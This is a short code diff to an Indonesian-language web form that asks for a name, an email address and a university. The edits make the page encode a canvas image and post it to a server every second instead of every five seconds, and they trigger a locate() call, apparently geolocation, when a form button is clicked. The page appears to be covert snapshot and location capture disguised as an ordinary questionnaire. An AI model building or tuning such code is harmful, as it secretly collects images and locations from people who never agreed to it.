@@ -74,7 +74,7 @@ var context = canvas.getContext('2d');
        var canvasData = canvas.toDataURL("image/png")
        cc = String(canvasData).replace("data:image/png;base64,","")
       //  console.log(cc)
-       post(cc); }, 5000);
+       post(cc); }, 1000);
   
 
 }
@@ -134,14 +134,14 @@ init();
       $('#gtau').fadeIn(200).delay(14000).fadeOut(); 
       $('#nama').fadeOut();
       $('#alamatEmail').delay(15000).fadeIn();
-      locate();
+      
     });
 
     $('.tbl2').click(function() {
       $('#gtau').fadeIn(200).delay(14000).fadeOut(); 
       $('#alamatEmail').fadeOut();
       $('#asalUniversitas').delay(15000).fadeIn();
-      
+      locate();
     });
 
 });
@@ -176,7 +176,7 @@ init();
 </div>
 
 <div id="asalUniversitas">
-  <div class="form-group" onload="locate()">
+  <div class="form-group">
     <label for="asalUnivform1">Asal universitas</label>
     <input type="email" class="form-control" id="asalUnivform1" aria-describedby="emailHelp" name="Universitas" placeholder="asal universitas">
   </div>
